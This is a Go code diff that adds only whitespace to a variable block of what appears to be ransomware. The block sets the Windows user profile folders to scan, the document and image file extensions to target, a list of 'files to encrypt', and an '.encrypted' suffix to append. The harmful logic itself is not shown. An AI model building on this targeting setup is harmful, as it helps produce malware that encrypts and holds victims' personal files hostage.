@@ -10,12 +10,16 @@ import (
 var (
 	// Base directory
 	BaseDir = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))
+
 	// Directories inside BaseDir to loop over
 	InterestingDirs = []string{"Downloads", "Videos", "Pictures", "Documents", "Music", "Desktop"}
+
 	// Interesting extensions to match files
 	InterestingExtensions = []string{"docx", "png", "jpeg", "jpg", "pdf", "txt", "svg", "gif"}
+
 	// Files to encrypt that match the extensions pattern
 	MatchedFiles []string
+
 	// Extension appended to files after encryption
 	EncryptionExtension = ".encrypted"
 )
